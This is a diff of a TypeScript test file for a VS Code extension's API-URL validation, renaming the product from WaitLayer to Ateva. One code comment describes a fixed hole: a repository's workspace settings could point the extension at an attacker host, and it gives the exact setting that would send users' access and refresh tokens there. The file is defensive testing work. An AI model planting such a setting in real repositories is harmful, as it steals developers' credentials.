@@ -1,11 +1,11 @@
 import { beforeEach, describe, expect, it, vi } from 'vitest';
 
 /**
- * The API origin decides where a WaitLayer access token is sent.
+ * The API origin decides where a Ateva access token is sent.
  *
- * `waitlayer.apiUrl` was plain `window` scope with no validation, so a
+ * `ateva.apiUrl` was plain `window` scope with no validation, so a
  * repository shipping `.vscode/settings.json` containing
- * `{"waitlayer.apiUrl": "https://evil.example/api/v1"}` repointed the extension
+ * `{"ateva.apiUrl": "https://evil.example/api/v1"}` repointed the extension
  * the moment the folder was opened — sending the developer's access AND refresh
  * tokens to the attacker. `scope: machine` in package.json stops workspace
  * values being read at all; these tests cover the second line of defence, since
@@ -21,7 +21,7 @@ vi.mock('vscode', () => ({
   ConfigurationTarget: { Global: 1 },
 }));
 
-const DEFAULT = 'https://api.waitlayer.com/api/v1';
+const DEFAULT = 'https://api.ateva.com/api/v1';
 
 async function apiUrl(value: string | undefined): Promise<string> {
   mock.configured = value;
@@ -47,8 +47,8 @@ describe('ConfigService.getApiUrl override validation', () => {
   it('accepts any https origin — scope: machine is what stops a workspace choosing it', async () => {
     // Deliberate: `scope: machine` is what stops a workspace choosing this.
     // A user who edits their own machine settings may point anywhere.
-    await expect(apiUrl('https://staging.waitlayer.com/api/v1')).resolves.toBe(
-      'https://staging.waitlayer.com/api/v1',
+    await expect(apiUrl('https://staging.ateva.com/api/v1')).resolves.toBe(
+      'https://staging.ateva.com/api/v1',
     );
   });
 
